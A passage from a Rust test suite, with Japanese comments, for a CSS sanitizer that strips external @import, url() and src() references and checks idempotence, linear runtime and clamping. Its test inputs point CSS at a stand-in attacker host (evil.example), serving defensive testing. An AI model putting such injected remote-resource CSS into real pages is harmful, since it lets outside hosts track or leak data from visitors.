            "@media{",
            "@import url(https://evil.example/a.css)",
            &deep_but_allowed,
        ];
        for css in cases {
            // panic せず・ハングせず返ること（拒否されるのは構わない）。
            // ⚠ 出力が返るケースは、必ず残留検証を通っている（`sanitize_css` の事後条件）。
            if let Ok(outcome) = sanitize_css(css) {
                assert_clean(&outcome);
            }
        }
    }

    #[test]
    fn idempotence_holds_for_every_removal_shape() {
        // ⚠ 冪等は**機能要件**（060c が「取得 CSS ＋ 保存済み CSS」を再度ここへ通す）。
        // ⚠ security-review② で除去規則が 3 つ増えたので、その形も 2 周目で動かないことを固定する
        //（新しい規則が「1 周目と 2 周目で違う判断をする」形で入ると、060c で静かに壊れる）。
        for css in [
            r#"@import url("https://evil.example/a.css");.sd-comment{color:red}"#,
            ".sd-comment{background:url(https://evil.example/x.png);color:red}",
            "@media screen{.sd-comment{background:url(https://evil.example/x.png)}}",
            r#".sd-comment{background-image:image-set(url("data:image/png;base64,AA") 1x)}"#,
            r#".sd-comment{background:url("data:image/png;base64,AA")}"#,
            // S-2: `src()`。
            r#"@font-face{font-family:X;src:src("https://evil.example/x.woff2")}"#,
            // S-1: 非 ASCII 前置の url。
            ".sd-comment{background:\u{A0}url(https://evil.example/x.png);color:red}",
            // S-7: 許可形 `data:` だけのプレリュード（**除去せず通る**側の冪等）。
            "@supports (background:url(data:image/png;base64,AA)){.sd-comment{color:red}}",
        ] {
            let once = run(css);
            let twice = run(&once.css);
            assert_eq!(twice.css, once.css, "2 周目で出力が変わった: {css}");
            assert_eq!(twice.stripped_count, 0, "2 周目で計数が動いた: {css}");
        }
    }

    // --- 計算量 ---------------------------------------------------------------------------------

    #[test]
    fn stays_linear_on_a_large_input() {
        // ⚠ 閾値は CI の遅さを見込んで大きく取り、**指数爆発だけを捕まえる**（060a と同じ方針）。
        // 060b のサイズ上限 256KB 相当の入力で測る。
        let unit = ".sd-comment{background:url(https://evil.example/x.png);color:red}\n";
        let css = unit.repeat(262_144 / unit.len());
        let started = std::time::Instant::now();
        let outcome = run(&css);
        let elapsed = started.elapsed();
        assert!(outcome.stripped_count > 1000);
        assert!(
            elapsed < std::time::Duration::from_secs(3),
            "256KB の入力に {elapsed:?} かかった（指数爆発の疑い）"
        );
    }

    #[test]
    fn the_import_url_list_is_clamped() {
        // 件数の clamp。
        let many = r#"@import "https://evil.example/a.css";"#.repeat(MAX_STRIPPED_IMPORT_URLS + 10);
        let outcome = run(&many);
        assert_eq!(
            outcome.stripped_import_urls.len(),
            MAX_STRIPPED_IMPORT_URLS
        );
        assert_eq!(
            outcome.stripped_count,
            (MAX_STRIPPED_IMPORT_URLS + 10) as u32,
            "clamp は表示用であって、計数まで削ってはいけない"
        );

        // 1 件の長さの clamp。
        let long = format!(
            "@import \"https://evil.example/{}\";",
            "a".repeat(MAX_STRIPPED_IMPORT_URL_CHARS)
        );
        let outcome = run(&long);
        assert_eq!(outcome.stripped_count, 1);
        assert!(
            outcome.stripped_import_urls.is_empty(),
            "長すぎる URL が clamp されていない"
        );
    }

    #[test]
    fn errors_never_carry_the_input_back_to_the_caller() {
        // §9: 文言は固定で、CSS 本文・URL を含めない。
        let marker = "evil-marker-9f3a";
        let css = format!("@media (background:url(https://{marker}.example/x)){{.a{{color:red}}}}");
        let err = sanitize_css(&css).expect_err("拒否されるべき");
        let json = serde_json::to_string(&err).unwrap_or_default();
        assert!(!json.contains(marker), "エラーが入力を持ち帰っている: {json}");
        assert!(!json.contains("http"), "エラーが URL 断片を持ち帰っている: {json}");
    }
}
